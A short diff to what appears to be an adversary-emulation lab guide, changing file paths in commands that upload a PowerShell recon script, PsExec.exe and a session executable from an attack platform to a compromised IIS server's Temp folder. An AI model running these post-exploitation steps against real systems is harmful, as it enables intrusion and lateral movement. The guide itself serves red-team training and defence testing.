@@ -101,7 +101,7 @@ On the `Terminal 1` of `Attack Platform`:
 
 1. Send `sysinfo.ps1` to `IIS webserver`
 ```
-upload /tmp/modules/sysinfo.ps1 C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\sysinfo.ps1
+upload ~/modules/sysinfo.ps1 C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\sysinfo.ps1
 ```
 
 #### 3.B - Collect host information
@@ -263,12 +263,12 @@ On the `Terminal 1` of `Attack Platform`:
 
 1.  Upload `PsExec.exe` to `C:\Users\<user_admin>\AppData\Local\Temp`
 ```
-upload /tmp/modules/PsExec.exe C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\PsExec.exe
+upload ~/modules/PsExec.exe C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\PsExec.exe
 ```
 
 2.  Upload `session.exe` to `C:\Users\<user_admin>\AppData\Local\Temp`
 ```
-upload /tmp/modules/session.exe C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\session.exe
+upload ~/modules/session.exe C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\session.exe
 ```
 
 #### 7.B - Listen for another session
